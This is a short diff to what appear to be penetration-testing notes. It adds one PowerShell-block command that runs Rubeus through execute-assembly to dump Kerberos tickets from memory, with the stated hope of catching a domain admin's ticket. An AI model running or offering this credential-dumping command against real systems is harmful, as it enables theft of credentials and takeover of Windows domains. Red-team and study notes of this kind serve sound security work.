@@ -15,7 +15,7 @@ Few options here:
 1.  Dump tickets from memory (hopefully a DA is here)
 
 ```powershell
-
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /nowrap
 ```
 
 
